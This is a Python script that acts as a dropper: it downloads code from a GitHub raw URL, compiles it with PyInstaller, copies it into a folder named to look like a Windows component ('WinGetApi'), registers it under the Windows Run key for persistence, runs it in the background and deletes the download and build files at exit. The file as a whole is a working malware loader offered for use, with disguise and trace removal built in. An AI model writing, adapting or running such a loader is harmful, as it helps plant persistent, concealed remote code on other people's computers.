import os
import platform
import subprocess
import urllib.request
import atexit
import shutil
import random
import logging
from pathlib import Path

# Constants
SCRIPT_URL = "https://raw.githubusercontent.com/DorkYBru/DiscordBotCommand/main/main.py"
SCRIPT_FILE_NAME = "downloaded_script.py"
OUTPUT_EXECUTABLE_NAME = "downloaded_script"

# Set up logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def generate_random_directory():
    if platform.system().lower() == "windows":
        random_dir = os.path.join(os.getenv("TEMP"), "WinGetApi" + str(random.randint(1, 1000)))
    else:
        random_dir = os.path.join(os.path.expanduser("~"), ".wingetapi")
    os.makedirs(random_dir, exist_ok=True)
    return random_dir

# Import winreg only if the platform is Windows
if platform.system().lower() == "windows":
    try:
        OUTPUT_EXECUTABLE_NAME = "downloaded_script.exe"
        import winreg
        HKEY_CURRENT_USER = winreg.HKEY_CURRENT_USER
        REG_SZ = winreg.REG_SZ
        SetValueEx = winreg.SetValueEx
        OpenKey = winreg.OpenKey
        KEY_SET_VALUE = winreg.KEY_SET_VALUE
    except ImportError:
        # Handle the absence of winreg on non-Windows platforms
        pass

def copy_to_random_location(source_file, random_directory):
    try:
        # Create the 'dist' directory if it doesn't exist
        dist_dir = os.path.join(random_directory, 'dist')
        os.makedirs(dist_dir, exist_ok=True)

        # Copy the compiled script to the 'dist' directory
        shutil.copy2(source_file, dist_dir)

        logger.info(f"Script copied to random location: {dist_dir}")
    except Exception as e:
        logger.error(f"Failed to copy script to random location: {e}")
        exit()

def add_to_startup(file_path):
    if platform.system().lower() == "windows":
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key_path = os.path.join("HKEY_CURRENT_USER", key)
        try:
            with OpenKey(HKEY_CURRENT_USER, key, 0, KEY_SET_VALUE) as registry_key:
                SetValueEx(registry_key, "WinGetApi", 0, REG_SZ, file_path)
            logger.info("Script added to startup successfully.")
        except Exception as e:
            logger.error(f"Failed to add script to startup: {e}")
    elif platform.system().lower() == "linux":
        # Modify this section for Linux startup (e.g., add a symbolic link to the user's autostart directory)
        logger.info("Adding script to startup on Linux is not implemented yet.")
    elif platform.system().lower() == "darwin":
        # Modify this section for macOS startup (e.g., use launchd or a plist file)
        logger.info("Adding script to startup on macOS is not implemented yet.")

def download_script(url, output_file):
    try:
        with urllib.request.urlopen(url) as response, open(output_file, 'wb') as output_file:
            output_file.write(response.read())
        logger.info(f"Script downloaded successfully to {output_file}")
    except Exception as e:
        logger.error(f"Failed to download the script: {e}")
        exit()

def compile_script(script_file):
    try:
        subprocess.run(["pyinstaller", "--onefile", script_file], check=True)
        logger.info("Script compiled successfully")
    except Exception as e:
        logger.error(f"Failed to compile the script: {e}")
        exit()

def run_compiled_script(output_executable):
    try:
        subprocess.Popen([os.path.join(output_executable, OUTPUT_EXECUTABLE_NAME)])
        logger.info(f"Script running in the background")
    except Exception as e:
        logger.error(f"Failed to run the compiled script: {e}")
        exit()

def get_initial_directory_state():
    return set(os.listdir())

def cleanup(initial_state):
    try:
        # List files before running the script
        before_script_files = initial_state

        # Remove downloaded script
        if os.path.exists(SCRIPT_FILE_NAME):
            os.remove(SCRIPT_FILE_NAME)
            logger.info(f"Downloaded script '{SCRIPT_FILE_NAME}' removed.")

        # Remove compiled script and associated files
        compiled_script_path = Path("dist") / OUTPUT_EXECUTABLE_NAME
        if compiled_script_path.exists():
            shutil.rmtree("build", ignore_errors=True)
            shutil.rmtree("dist", ignore_errors=True)
            logger.info(f"Compiled script '{OUTPUT_EXECUTABLE_NAME}' and associated files removed.")

        # List files after running the script
        after_script_files = set(os.listdir())

        # Find new files created during script execution and remove them
        new_files = after_script_files - before_script_files
        for file in new_files:
            file_path = os.path.join(os.getcwd(), file)
            if os.path.isfile(file_path):
                # Exclude the .wingetapi folder from deletion
                if not (os.path.isdir(file_path) and file_path.endswith('.wingetapi')):
                    os.remove(file_path)
                    logger.info(f"New file '{file}' created during script execution removed.")

    except Exception as e:
        logger.error(f"Cleanup failed: {e}")

def main():
    current_os = platform.system().lower()

    # Get initial directory state
    initial_directory_state = get_initial_directory_state()

    # Register the cleanup function to be called at exit
    atexit.register(cleanup, initial_directory_state)

    try:
        logger.info("Starting script download...")
        download_script(SCRIPT_URL, SCRIPT_FILE_NAME)
        logger.info("Starting script compilation...")
        compile_script(SCRIPT_FILE_NAME)

        # Generate a random directory and copy the compiled script
        random_directory = generate_random_directory()
        copy_to_random_location(Path("dist") / OUTPUT_EXECUTABLE_NAME, random_directory)

        # Add the script to startup
        add_to_startup(os.path.join(random_directory, OUTPUT_EXECUTABLE_NAME))

        # Run the compiled script
        run_compiled_script(random_directory)
    except Exception as e:
        logger.error(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
